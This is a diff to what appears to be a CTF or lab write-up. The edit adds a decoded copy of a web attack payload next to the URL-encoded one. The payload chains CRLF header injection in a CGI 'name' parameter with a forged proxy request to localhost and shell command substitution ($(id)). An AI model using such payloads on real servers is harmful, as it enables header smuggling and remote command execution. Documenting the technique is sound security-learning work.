@@ -181,7 +181,16 @@ Each attempt either got blocked, sanitized, or just… failed. I even got 400s, 
 
 **After hours of trial and error**, I crafted the following initial payload:
 
-`GET /cgi-bin/attack-domain?target=Glitch&name=a1%0d%0aLocation:+/azx%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1`
+Decoded URL (For clarification only):
+```
+GET /cgi-bin/attack-domain?target=Glitch&name=a1
+Location: /azx
+Content-type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=127.0.0.1%$(id)&name=
+
+ HTTP/1.1
+ ```
+Encoded URL: (Always Ensure URL Encodeing)!
+```GET /cgi-bin/attack-domain?target=Glitch&name=a1%0d%0aLocation:+/azx%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1```
 
 but I got the following response:
 
@@ -209,6 +218,7 @@ Here’s the kicker: our forged request via CRLF (in name) **injects a whole new
 
 
 So, I've updated my payload:
+
 Decoded URL (For clarification only):
 ```
 GET /cgi-bin/attack-domain?target=Glitch&name=a1
